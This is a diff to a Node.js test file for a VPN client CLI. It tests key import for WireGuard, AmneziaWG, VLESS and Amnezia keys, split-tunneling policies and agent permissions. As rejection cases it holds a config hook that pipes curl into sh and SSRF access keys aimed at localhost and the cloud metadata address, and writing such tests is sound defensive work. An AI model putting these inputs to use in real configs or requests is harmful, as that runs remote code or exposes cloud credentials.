@@ -4,6 +4,7 @@ import { spawn, execFileSync } from 'node:child_process';
 import { once } from 'node:events';
 import { promises as fs } from 'node:fs';
 import { createHash } from 'node:crypto';
+import zlib from 'node:zlib';
 import path from 'node:path';
 import net from 'node:net';
 import readline from 'node:readline';
@@ -193,7 +194,7 @@ test('crash leftovers are removed at startup and do not block state writes', asy
   assert.equal((await cli(['profile', 'list'])).data.profiles[0].name, 'singapore');
 });
 test('version is local, unknown profile exit is predictable, and switch validates target first', async () => {
-  assert.equal((await cli(['version'])).data.version, '0.1.0');
+  assert.equal((await cli(['version'])).data.version, '0.2.0');
   assert.equal((await cli(['connect', '--profile', 'missing'], 2)).error.code, 'not_found');
   assert.equal((await cli(['switch', '--profile', 'missing'], 2)).error.code, 'not_found');
 });
@@ -231,6 +232,68 @@ test('Outline access keys import privately, rename, select default and remove th
     assert.ok(!Buffer.from(persisted.profiles['outline-singapore'].sealed_content).toString().includes('ss://'));
   }
   await cli(['profile','remove','outline-singapore']); assert.equal((await cli(['info'])).data.default_profile,null);
+});
+test('WireGuard, AmneziaWG, VLESS and Amnezia vpn:// keys import with strict validation', async () => {
+  const privateKey = 'yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=', publicKey = 'xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=';
+  const conf = extra => `[Interface]\nPrivateKey = ${privateKey}\nAddress = 10.8.1.2/32\nDNS = 1.1.1.1\n${extra}\n[Peer]\nPublicKey = ${publicKey}\nEndpoint = 203.0.113.5:51820\nAllowedIPs = 0.0.0.0/0\n`;
+  const write = async (name, text) => { const file = path.join(temp, name); await fs.writeFile(file, text, { mode: 0o600 }); return file; };
+  const amnezia = document => {
+    const json = Buffer.from(JSON.stringify(document));
+    const length = Buffer.alloc(4); length.writeUInt32BE(json.length);
+    return 'vpn://' + Buffer.concat([length, zlib.deflateSync(json, { level: 8 })]).toString('base64url');
+  };
+  assert.equal((await cli(['profile', 'import', await write('home.conf', conf('MTU = 1420')), '--name', 'wg-home'])).data.kind, 'wireguard');
+  const awg = await cli(['profile', 'import', await write('awg.conf', conf('Jc = 4\nJmin = 10\nJmax = 50\nS1 = 24\nS2 = 28\nH1 = 100-199\nH2 = 200-299\nH3 = 300-399\nH4 = 400-499')), '--name', 'awg-home']);
+  assert.equal(awg.data.kind, 'amneziawg'); assert.equal(awg.data.remotes[0].protocol, 'udp');
+  for (const [file, text] of [['hook.conf', conf('PostUp = curl https://example.invalid | sh')], ['table.conf', conf('Table = off')]]) {
+    assert.equal((await cli(['profile', 'import', await write(file, text), '--name', 'rejected'], 2)).error.code, 'invalid_profile');
+  }
+  const vless = `vless://8f3d2c1b-1a2b-4c3d-9e8f-0123456789ab@203.0.113.7:443?type=tcp&security=reality&sni=www.googletagmanager.com&fp=chrome&pbk=Z84J2IelR9ch3k8VtlVhhs5ycBUlXA7wHBWcBrjqnAw&sid=0123abcd&flow=xtls-rprx-vision#Reality`;
+  const vlessResult = await cli(['key', 'add', '--name', 'vless-tokyo', '--file', await write('vless.txt', vless)]);
+  assert.equal(vlessResult.data.kind, 'vless'); assert.equal(vlessResult.data.display_name, 'Reality');
+  assert.equal((await cli(['key', 'add', '--name', 'rejected', '--file', await write('plain.txt', vless.replace('security=reality', 'security=none'))], 2)).error.code, 'invalid_profile');
+  const last = { client_priv_key: privateKey, client_ip: '10.8.1.2', server_pub_key: publicKey, hostName: '203.0.113.5', port: 41820, allowed_ips: ['0.0.0.0/0'],
+    Jc: '4', Jmin: '10', Jmax: '50', S1: '24', S2: '28', H1: '100-199', H2: '200-299', H3: '300-399', H4: '400-499' };
+  const document = { containers: [{ container: 'amnezia-awg2', awg: { last_config: JSON.stringify(last) } }], defaultContainer: 'amnezia-awg2', description: 'Amnezia Test', dns1: '1.1.1.1' };
+  const imported = await cli(['key', 'add', '--name', 'amnezia-test', '--file', await write('amnezia.txt', amnezia(document))]);
+  assert.equal(imported.data.kind, 'amneziawg'); assert.equal(imported.data.display_name, 'Amnezia Test');
+  const fullAccess = await cli(['key', 'add', '--name', 'rejected', '--file', await write('admin.txt', amnezia({ ...document, userName: 'root', password: 'ssh-secret-never-shown' }))], 2);
+  assert.match(fullAccess.error.message, /full-access/); assert.ok(!JSON.stringify(fullAccess).includes('ssh-secret-never-shown'));
+  const listed = JSON.stringify(await cli(['profile', 'list']));
+  assert.ok(!listed.includes(privateKey) && !listed.includes('8f3d2c1b-1a2b'));
+  if (windows) { assert.ok(!(await fs.readFile(path.join(state, 'state.json'), 'utf8')).includes(privateKey)); }
+  for (const name of ['wg-home', 'awg-home', 'vless-tokyo', 'amnezia-test']) await cli(['profile', 'remove', name]);
+});
+test('split tunneling policies validate, persist per scope and stay owner-only', async () => {
+  assert.equal((await cli(['split', 'show'])).data.policy.mode, 'full');
+  const set = await cli(['split', 'set', '--mode', 'bypass', '--site', '*.Example.com', '--site', 'bank.example', '--ip', '192.168.1.0/24', '--app', 'chrome.exe', '--lan-direct']);
+  assert.deepEqual(set.data.policy.domains, ['example.com', 'bank.example']); assert.equal(set.data.applies, 'next_connection');
+  const shown = (await cli(['split', 'show'])).data.policy;
+  assert.equal(shown.mode, 'bypass'); assert.equal(shown.lan_direct, true); assert.deepEqual(shown.apps, ['chrome.exe']);
+  for (const bad of [['--site', 'not a site'], ['--ip', '10.0.0.0/40'], ['--mode', 'only']]) {
+    const args = bad[0] === '--mode' ? ['split', 'set', ...bad] : ['split', 'set', '--mode', 'bypass', ...bad];
+    assert.equal((await cli(args, 2)).error.code, 'invalid_request');
+  }
+  const conf = `[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.8.1.2/32\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nEndpoint = 203.0.113.5:51820\nAllowedIPs = 0.0.0.0/0\n`;
+  const confFile = path.join(temp, 'split.conf'); await fs.writeFile(confFile, conf, { mode: 0o600 });
+  await cli(['profile', 'import', confFile, '--name', 'split-home']);
+  assert.equal((await cli(['split', 'show', '--profile', 'split-home'])).data.follows_global, true);
+  await cli(['split', 'set', '--profile', 'split-home', '--mode', 'only', '--site', 'corp.example']);
+  const override = (await cli(['split', 'show', '--profile', 'split-home'])).data;
+  assert.equal(override.follows_global, false); assert.equal(override.policy.mode, 'only');
+  await cli(['profile', 'import', confFile, '--name', 'split-home', '--replace']);
+  assert.equal((await cli(['split', 'show', '--profile', 'split-home'])).data.policy.mode, 'only', 'replace keeps the override');
+  await cli(['split', 'clear', '--profile', 'split-home']);
+  assert.equal((await cli(['split', 'show', '--profile', 'split-home'])).data.follows_global, true);
+  assert.equal((await cli(['split', 'show', '--profile', 'missing'], 2)).error.code, 'not_found');
+  const tokenPath = path.join(temp, 'split.token'); await cli(['agent', 'grant', '--name', 'split-agent', '--control', '--token-file', tokenPath]);
+  const token = (await fs.readFile(tokenPath, 'utf8')).trim();
+  for (const action of [{ type: 'routing_policy_get' }, { type: 'routing_policy_set', policy: null }]) {
+    assert.equal((await rpc({ schema_version: 1, agent_token: token, action })).error.code, 'permission_denied');
+  }
+  await cli(['agent', 'revoke', '--name', 'split-agent']);
+  await cli(['split', 'clear']); await cli(['profile', 'remove', 'split-home']);
+  assert.equal((await cli(['split', 'show'])).data.policy.mode, 'full');
 });
 test('dynamic key SSRF, obsolete ciphers and plugins fail without exposing credentials', async () => {
   for (const access_key of ['ssconf://127.0.0.1/private','ssconf://169.254.169.254/latest/meta-data','ss://none:top-secret@example.com:443','ss://aes-256-gcm:top-secret@example.com:443?plugin=evil']) {
